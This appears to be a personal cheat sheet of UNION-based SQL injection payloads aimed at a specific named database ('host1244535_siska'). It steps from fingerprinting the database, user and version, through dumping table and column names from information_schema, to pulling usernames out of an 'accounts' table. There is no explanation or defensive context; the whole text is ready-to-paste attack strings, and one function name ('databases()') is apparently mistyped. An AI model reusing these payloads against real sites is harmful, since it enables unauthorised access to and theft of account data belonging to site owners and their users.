info gathering 
```
1'union select 1,2,3,databases(),user(),version(),7 -- -
```

tables name dump
```
'union select 1,2,3,4,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'host1244535_siska'),version(),7 -- - 
```

column dump
```
'union select 1,2,3,4,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema = 'host1244535_siska'),version(),7 -- -
```

table data dump
```
'union select 1,2,3,4,(SELECT GROUP_CONCAT(username) from host1244535_siska.accounts ),version(),7 -- -
```
or
```
'union select 1,2,3,4,(SELECT username from host1244535_siska.accounts ),version(),7 -- -
```